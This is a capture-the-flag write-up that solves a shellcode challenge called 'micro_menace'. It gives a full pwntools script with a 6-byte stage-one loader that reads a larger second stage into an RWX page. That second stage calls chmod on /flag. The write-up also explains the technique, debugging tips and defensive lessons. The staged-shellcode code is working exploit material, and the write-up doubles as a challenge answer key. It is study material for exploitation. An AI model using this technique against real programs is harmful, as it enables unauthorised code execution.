# Micro-Menace — Exploit Writeup

**Goal.** Supply ≤6 bytes of shellcode (first stage) which executes, performs a second `read()` to load a larger second stage into an RWX page, then execute the second stage that `chmod("/flag", 0777)` and reads the flag.

**Key idea.** *Live off the land*: reuse registers and memory the challenge already sets up. Use a tiny 6-byte loader that calls `read()` to stream in a larger second stage into the same RWX mapping and then fall through into that second stage (no explicit `jmp` required).

---

## Exploit (pwntools)

```python
from pwn import *
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

p = process("/challenge/micro_menace")

# Stage 1: fits in the 6-byte allowance
payload = asm(
"""
xor edi, edi        ; rdi = 0 (stdin)        -- 2 bytes
push rdx            ; push current rdx       -- 1 byte
pop rsi             ; rsi = rdx (buffer)     -- 1 byte
syscall             ; read(0, rsi, rdx)      -- 2 bytes (rax==0 already)
"""
)

# Stage 2: larger shellcode loaded by stage1's read
my_shell = asm(
"""
nop
nop
nop

push 0                      ; null terminator
mov rbx, 0x67616c662f2f2f2f ; "////flag" little-endian
push rbx
mov rdi, rsp                ; rdi -> "////flag\0"
mov esi, 0x1ff              ; mode = 0777 (octal) = 0x1ff
mov eax, 0x5a               ; syscall number for chmod (90)
syscall                     ; chmod("/flag", 0777)
"""
)

# Send stage1, a NOP sled, then stage2 in one continuous stream.
p.send(payload + asm("nop")*0x100 + my_shell)
p.interactive()
```

---

## Annotated explanation

### What the binary provides (environmental facts)

* The binary `mmap()`s an **RWX** page at a known address and stores it as `shellcode`.
* It does `read(0, shellcode, 6)` to read up to 6 input bytes into that page, stores the returned size, prints a disassembly of the bytes, then `call shellcode`.
* At `call shellcode` time, registers are already useful: `rax == 0` (read syscall), `rdx` points at/near the RWX mapping (large value), etc.

### Stage 1 (the 6-byte loader)

Assembly and rationale:

```asm
xor edi, edi   ; fd = 0 (stdin)           ; 2 bytes
push rdx       ; push the current rdx     ; 1 byte
pop rsi        ; pop into rsi (buffer ptr) ; 1 byte
syscall        ; invoke read(0, rsi, rdx) ; 2 bytes
```

Total = **6 bytes**. This reads the rest of our input stream into the RWX page (we rely on `rax == 0` and `rdx` being usable for size).

**Why this is powerful:** stage1 does not encode addresses or lengths — it *reuses* `rdx` and `rax` set by the program to perform a large read and load stage2 into the RWX area.

### Stage 2 (the real shellcode)

* After the `read` completes, kernel copies the remaining bytes from your continuous stdin stream into the RWX page (overwriting the page contents).
* The stage2 builds a pathname on the stack (we use `"////flag\0"` which is semantically `/flag`), sets mode `0o777` (0x1ff), and calls `chmod` via syscall. Example:

```asm
push 0
mov rbx, 0x67616c662f2f2f2f ; "////flag"
push rbx
mov rdi, rsp
mov esi, 0x1ff
mov eax, 0x5a
syscall
```

---

## Why `p.send(payload + asm("nop")*0x100 + my_shell)` works (brief)

1. You send a single continuous stream: stage1 (6 bytes) → NOP sled → stage2.
2. The binary initially reads **only the first 6 bytes** into the RWX page (`read(0, shellcode, 6)`).
3. The binary calls `shellcode` (executes stage1). Stage1 runs and issues a `read(0, rsi, rdx)` syscall.
4. During that `syscall`, the kernel **reads the remainder of your continuous stream** and writes it into the memory pointed to by `rsi` (the RWX page). This **overwrites** the small stage1 bytes with your NOPs + stage2.
5. When `syscall` returns to userland, execution continues at the next instruction after the `syscall` inside the page — but that memory now contains your NOPs/stage2. The CPU fetches those new bytes and executes stage2 — no explicit `jmp` is needed.
6. The NOP sled (`asm('nop')*0x100`) makes the landing safe and tolerant to small alignment differences.

This is the canonical staged shellcode technique: **tiny first stage reads a larger second stage into executable memory and then execution naturally falls through into the second stage.**

---

## Micro tricks used

* **Register reuse:** reused `rdx` and `rax` already set by the binary. That avoids immediate constants and saves bytes.
* **push/pop copy:** `push rdx; pop rsi` is a minimal 2-byte register copy when encoding allows it.
* **Multiple slashes:** `"////flag"` is accepted by the path parser as `/flag`, so we can encode the path conveniently.
* **NOP sled:** makes the transition from stage1 to stage2 robust.

---

## Why inline `chmod` in stage1 would not fit

* `mov esi, 0x1A4` (for `0644`) or `mov esi, 0x1ff` (for `0777`) + `mov eax, 0x5a` + `syscall` requires more than 6 bytes. The two-stage approach bypasses that limit.

---

## Testing & debugging tips

* Use `int3` (0xCC) as the 6 bytes during debugging so GDB breaks at `call shellcode` and you can inspect registers (`info registers`) before the stage1 runs.
* Watch the `print_disassembly` output the binary prints — it shows the bytes you provided for stage1 so you can verify delivery.
* In GDB, after stage1 `syscall`, inspect memory at the RWX page to see that NOPs + stage2 were written.

---

## Defensive notes (why this is insecure)

* Mapping RWX memory at a predictable address and `call`ing user-supplied bytes is highly unsafe.
* Avoid giving untrusted input directly into executable memory; if necessary, make pages non-executable until code integrity is validated.
* Limit read sizes and do input validation; prefer not to expose `read` into executable pages.

---

## Conclusion

This exploit demonstrates the *live off the land* pattern: send a tiny loader that reuses CPU state (rax/rdx) to `read()` a full second stage into an RWX page and then continue into that second stage. The continuous `p.send(payload + nop*0x100 + my_shell)` stream allows the kernel `read` to place the second stage at the same address the CPU is executing — when `syscall` returns, the CPU simply executes the newly-written code.
